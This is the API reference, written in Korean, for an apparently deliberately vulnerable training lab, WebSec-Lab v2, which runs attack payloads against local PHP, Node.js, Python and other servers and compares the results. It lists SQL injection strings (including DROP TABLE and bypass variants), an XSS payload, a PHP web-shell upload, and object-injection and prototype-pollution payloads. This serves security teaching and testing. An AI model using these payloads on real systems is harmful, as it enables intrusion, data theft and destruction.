# API 레퍼런스 📚

## 📋 개요

WebSec-Lab v2는 RESTful API를 통해 멀티 언어 취약점 테스트를 제공합니다. 모든 API는 JSON 형식으로 통신하며, 표준화된 응답 구조를 따릅니다.

## 🌐 Base URLs

```
Dashboard API:    http://localhost/api
PHP Server:       http://localhost:8080
Node.js Server:   http://localhost:3000
Python Server:    http://localhost:5000
Java Server:      http://localhost:8081
Go Server:        http://localhost:8082
```

## 🔧 표준 API 인터페이스

모든 언어 서버는 동일한 API 규격을 따릅니다.

### 공통 요청 헤더
```http
Content-Type: application/json
Accept: application/json
```

### 공통 응답 구조
```json
{
  "language": "php|nodejs|python|java|go",
  "vulnerability": "vulnerability-type",
  "payload": "user-input",
  "mode": "vulnerable|safe",
  "result": {
    "success": true,
    "data": "...",
    "execution_time": 0.025
  },
  "analysis": {
    "risk_level": "low|medium|high|critical",
    "attack_type": "injection|bypass|escalation|disclosure",
    "impact": "description",
    "recommendations": ["..."]
  },
  "timestamp": "2024-01-01T12:00:00Z"
}
```

## 🎯 Dashboard API

### 1. 서버 상태 확인

#### 모든 언어 서버 상태
```http
GET /api/servers/status
```

**Response:**
```json
{
  "status": "success",
  "servers": {
    "php": {
      "status": "healthy",
      "url": "http://php-server:8080",
      "response_time": 0.012,
      "last_check": "2024-01-01T12:00:00Z"
    },
    "nodejs": {
      "status": "healthy",
      "url": "http://nodejs-server:3000",
      "response_time": 0.008,
      "last_check": "2024-01-01T12:00:00Z"
    },
    "python": {
      "status": "unhealthy",
      "url": "http://python-server:5000",
      "error": "Connection timeout",
      "last_check": "2024-01-01T12:00:00Z"
    }
  },
  "summary": {
    "total": 5,
    "healthy": 4,
    "unhealthy": 1
  }
}
```

#### 특정 서버 상태
```http
GET /api/servers/{language}/status
```

### 2. 크로스 언어 테스트

#### 여러 언어에서 동시 테스트
```http
POST /api/test/cross-language
```

**Request:**
```json
{
  "vulnerability": "sql-injection",
  "payload": "1' OR '1'='1",
  "languages": ["php", "nodejs", "python", "java"],
  "mode": "vulnerable",
  "parameters": {
    "target": "username",
    "context": "login"
  }
}
```

**Response:**
```json
{
  "test_id": "uuid-test-id",
  "request": {
    "vulnerability": "sql-injection",
    "payload": "1' OR '1'='1",
    "languages": ["php", "nodejs", "python", "java"],
    "mode": "vulnerable"
  },
  "results": {
    "php": {
      "language": "php",
      "vulnerability": "sql-injection",
      "result": {
        "success": true,
        "affected_rows": 3,
        "execution_time": 0.023
      },
      "analysis": {
        "risk_level": "critical",
        "attack_type": "authentication_bypass",
        "impact": "Full database access possible"
      }
    },
    "nodejs": {
      "language": "nodejs",
      "vulnerability": "sql-injection",
      "result": {
        "success": true,
        "affected_rows": 3,
        "execution_time": 0.019
      },
      "analysis": {
        "risk_level": "critical",
        "attack_type": "authentication_bypass",
        "impact": "Database access via ORM injection"
      }
    }
  },
  "comparison": {
    "common_vulnerabilities": ["authentication_bypass"],
    "language_differences": {
      "php": "Direct MySQL injection",
      "nodejs": "ORM-based injection"
    },
    "risk_assessment": "critical"
  },
  "timestamp": "2024-01-01T12:00:00Z"
}
```

### 3. 테스트 결과 관리

#### 테스트 결과 조회
```http
GET /api/test/results/{test_id}
```

#### 테스트 히스토리
```http
GET /api/test/history?limit=50&page=1
```

#### 테스트 결과 비교
```http
POST /api/test/compare
```

**Request:**
```json
{
  "test_ids": ["test-id-1", "test-id-2"],
  "comparison_type": "vulnerability|language|payload"
}
```

### 4. 페이로드 관리

#### 사용 가능한 페이로드 조회
```http
GET /api/payloads/{vulnerability-type}
```

**Response:**
```json
{
  "vulnerability_type": "sql-injection",
  "payloads": {
    "basic": [
      "' OR '1'='1",
      "1' OR 1=1--",
      "admin'--"
    ],
    "advanced": [
      "1' UNION SELECT null,username,password FROM users--",
      "1'; DROP TABLE users;--"
    ],
    "bypass": [
      "1'/**/OR/**/1=1--",
      "1' %6FR 1=1--"
    ]
  },
  "language_specific": {
    "php": ["mysql_real_escape_string bypass"],
    "nodejs": ["mongoose injection"],
    "python": ["sqlalchemy injection"]
  }
}
```

#### 사용자 정의 페이로드 추가
```http
POST /api/payloads/{vulnerability-type}
```

## 🖥️ 언어별 서버 API

### 공통 엔드포인트

#### 1. 서버 정보
```http
GET /
```

**Response:**
```json
{
  "language": "PHP",
  "framework": "Custom MVC",
  "version": "8.2",
  "vulnerabilities": [
    "sql-injection",
    "xss",
    "object-injection",
    "file-inclusion"
  ],
  "features": {
    "databases": ["mysql", "postgresql"],
    "real_execution": true,
    "safe_mode": true
  }
}
```

#### 2. 헬스체크
```http
GET /health
```

**Response:**
```json
{
  "status": "healthy",
  "language": "php",
  "timestamp": "2024-01-01T12:00:00Z",
  "checks": {
    "database": "connected",
    "redis": "connected",
    "memory_usage": "45%",
    "cpu_usage": "12%"
  }
}
```

#### 3. 취약점 테스트
```http
POST /vulnerabilities/{vulnerability-type}
```

**Request:**
```json
{
  "payload": "test payload",
  "mode": "vulnerable|safe",
  "parameters": {
    "target": "field_name",
    "context": "login|search|upload",
    "encoding": "none|url|base64",
    "method": "GET|POST|PUT"
  }
}
```

## 🛡️ 취약점별 API 상세

### 1. SQL Injection

#### PHP 서버
```http
POST /vulnerabilities/sql-injection
```

**Request:**
```json
{
  "payload": "1' OR '1'='1",
  "mode": "vulnerable",
  "parameters": {
    "target": "user_id",
    "query_type": "select|insert|update|delete",
    "database": "mysql|postgresql"
  }
}
```

**Response:**
```json
{
  "language": "php",
  "vulnerability": "sql-injection",
  "payload": "1' OR '1'='1",
  "mode": "vulnerable",
  "result": {
    "success": true,
    "query": "SELECT * FROM users WHERE id = '1' OR '1'='1'",
    "affected_rows": 5,
    "data": [
      {"id": 1, "username": "admin", "role": "administrator"},
      {"id": 2, "username": "user1", "role": "user"}
    ],
    "execution_time": 0.023
  },
  "analysis": {
    "risk_level": "critical",
    "attack_type": "authentication_bypass",
    "impact": "Complete database access, potential data exfiltration",
    "cwe": "CWE-89",
    "owasp": "A03:2021 – Injection",
    "recommendations": [
      "Use prepared statements",
      "Implement input validation",
      "Apply principle of least privilege"
    ]
  },
  "safe_comparison": {
    "query": "SELECT * FROM users WHERE id = ?",
    "parameters": ["1' OR '1'='1"],
    "result": "No rows returned - injection neutralized"
  },
  "timestamp": "2024-01-01T12:00:00Z"
}
```

#### Node.js 서버
```http
POST /vulnerabilities/sql-injection
```

**특화 기능:**
- NoSQL injection (MongoDB)
- ORM injection (Sequelize, Mongoose)
- GraphQL injection

### 2. XSS (Cross-Site Scripting)

#### 반사형 XSS
```http
POST /vulnerabilities/xss
```

**Request:**
```json
{
  "payload": "<script>alert('XSS')</script>",
  "mode": "vulnerable",
  "parameters": {
    "xss_type": "reflected|stored|dom",
    "context": "html|attribute|javascript|css",
    "encoding": "none|html|url|unicode"
  }
}
```

**Response:**
```json
{
  "language": "php",
  "vulnerability": "xss",
  "payload": "<script>alert('XSS')</script>",
  "mode": "vulnerable",
  "result": {
    "success": true,
    "rendered_output": "<div>Hello <script>alert('XSS')</script></div>",
    "script_executed": true,
    "execution_time": 0.012
  },
  "analysis": {
    "risk_level": "high",
    "attack_type": "client_side_injection",
    "impact": "Cookie theft, session hijacking, defacement",
    "cwe": "CWE-79",
    "owasp": "A03:2021 – Injection",
    "recommendations": [
      "Use output encoding (htmlspecialchars)",
      "Implement Content Security Policy",
      "Validate and sanitize input"
    ]
  },
  "safe_comparison": {
    "rendered_output": "<div>Hello &lt;script&gt;alert('XSS')&lt;/script&gt;</div>",
    "script_executed": false,
    "method": "htmlspecialchars() encoding"
  }
}
```

### 3. 파일 업로드 취약점

```http
POST /vulnerabilities/file-upload
Content-Type: multipart/form-data
```

**Request:**
```
--boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
--boundary
Content-Disposition: form-data; name="mode"

vulnerable
--boundary--
```

### 4. 역직렬화 취약점

#### PHP Object Injection
```http
POST /vulnerabilities/object-injection
```

**Request:**
```json
{
  "payload": "O:10:\"EvilObject\":1:{s:4:\"code\";s:10:\"phpinfo();\";}",
  "mode": "vulnerable",
  "parameters": {
    "serialization_format": "php|json|xml",
    "trigger_method": "unserialize|json_decode|simplexml_load_string"
  }
}
```

#### Node.js Prototype Pollution
```http
POST /vulnerabilities/prototype-pollution
```

**Request:**
```json
{
  "payload": "{\"__proto__\":{\"polluted\":\"yes\",\"isAdmin\":true}}",
  "mode": "vulnerable",
  "parameters": {
    "merge_function": "lodash|jquery|custom",
    "target_property": "__proto__|constructor.prototype"
  }
}
```

#### Python Pickle Deserialization
```http
POST /vulnerabilities/pickle-deserialization
```

**Request:**
```json
{
  "payload": "base64_encoded_pickle_payload",
  "mode": "vulnerable",
  "parameters": {
    "pickle_protocol": "0|1|2|3|4|5",
    "loader": "pickle|dill|joblib"
  }
}
```

## 🔍 고급 기능

### 1. 벤치마킹 API

#### 성능 비교 테스트
```http
POST /api/benchmark
```

**Request:**
```json
{
  "vulnerability": "sql-injection",
  "payload": "1' OR '1'='1",
  "languages": ["php", "nodejs", "python"],
  "iterations": 100,
  "concurrent_requests": 10
}
```

### 2. 리포트 생성 API

#### 상세 분석 리포트
```http
POST /api/reports/generate
```

**Request:**
```json
{
  "test_ids": ["test-1", "test-2", "test-3"],
  "format": "json|pdf|html",
  "include": {
    "executive_summary": true,
    "technical_details": true,
    "remediation_guide": true,
    "code_examples": true
  }
}
```

### 3. 웹훅 API

#### 테스트 완료 알림
```http
POST /api/webhooks/register
```

**Request:**
```json
{
  "url": "https://your-server.com/webhook",
  "events": ["test.completed", "vulnerability.detected"],
  "secret": "webhook_secret_key"
}
```

## 🚨 에러 응답

### 표준 에러 형식
```json
{
  "error": true,
  "code": "VULNERABILITY_NOT_FOUND",
  "message": "The requested vulnerability type is not supported",
  "details": {
    "vulnerability": "unknown-vulnerability",
    "supported_types": ["sql-injection", "xss", "csrf"]
  },
  "timestamp": "2024-01-01T12:00:00Z"
}
```

### 에러 코드 목록

| 코드 | 설명 | HTTP 상태 |
|------|------|----------|
| `INVALID_PAYLOAD` | 잘못된 페이로드 형식 | 400 |
| `VULNERABILITY_NOT_FOUND` | 지원하지 않는 취약점 | 404 |
| `SERVER_UNAVAILABLE` | 언어 서버 연결 실패 | 503 |
| `EXECUTION_TIMEOUT` | 실행 시간 초과 | 408 |
| `RATE_LIMIT_EXCEEDED` | 요청 빈도 제한 초과 | 429 |
| `INTERNAL_ERROR` | 내부 서버 오류 | 500 |

## 📊 레이트 리미팅

### 기본 제한
- **일반 요청**: 100 requests/minute
- **취약점 테스트**: 50 requests/minute
- **크로스 언어 테스트**: 10 requests/minute
- **리포트 생성**: 5 requests/minute

### 헤더 정보
```http
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 95
X-RateLimit-Reset: 1640995200
```

## 🔐 인증 (선택사항)

### API 키 인증
```http
Authorization: Bearer your-api-key
```

### 기본 인증
```http
Authorization: Basic base64(username:password)
```

## 📝 사용 예시

### cURL 예시
```bash
# 단일 언어 테스트
curl -X POST http://localhost:8080/vulnerabilities/sql-injection \
  -H "Content-Type: application/json" \
  -d '{"payload":"1'\'' OR '\''1'\''='\''1","mode":"vulnerable"}'

# 크로스 언어 테스트
curl -X POST http://localhost/api/test/cross-language \
  -H "Content-Type: application/json" \
  -d '{
    "vulnerability": "sql-injection",
    "payload": "1'\'' OR '\''1'\''='\''1",
    "languages": ["php", "nodejs", "python"],
    "mode": "vulnerable"
  }'
```

### JavaScript/Fetch 예시
```javascript
// 크로스 언어 테스트
const response = await fetch('/api/test/cross-language', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    vulnerability: 'sql-injection',
    payload: "1' OR '1'='1",
    languages: ['php', 'nodejs', 'python'],
    mode: 'vulnerable'
  })
});

const result = await response.json();
console.log('Test Results:', result);
```

### Python/Requests 예시
```python
import requests

# 단일 언어 테스트
response = requests.post(
    'http://localhost:3000/vulnerabilities/prototype-pollution',
    json={
        'payload': '{"__proto__":{"polluted":"yes"}}',
        'mode': 'vulnerable'
    }
)

result = response.json()
print(f"Risk Level: {result['analysis']['risk_level']}")
```

이 API 문서는 WebSec-Lab v2의 모든 기능을 활용하는 데 필요한 완전한 참고 자료입니다.